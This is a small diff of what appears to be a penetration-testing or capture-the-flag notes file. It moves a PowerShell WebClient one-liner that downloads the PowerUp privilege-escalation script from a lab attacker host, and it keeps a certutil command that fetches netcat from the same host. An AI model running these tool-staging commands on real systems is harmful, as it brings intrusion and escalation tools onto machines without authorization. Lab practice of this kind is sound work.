@@ -33,9 +33,9 @@ more < letter.txt
 type letter.txt | more 
 
 
-$url = "http://10.10.16.112/powerUp.ps1";$output = "C:\Users\Chase\Desktop\powerUp.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);
-
 #Download file
+
+$url = "http://10.10.16.112/powerUp.ps1";$output = "C:\Users\Chase\Desktop\powerUp.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);
 
 certutil -urlcache -split -f http://10.10.16.112/nc.exe nc.exe
 
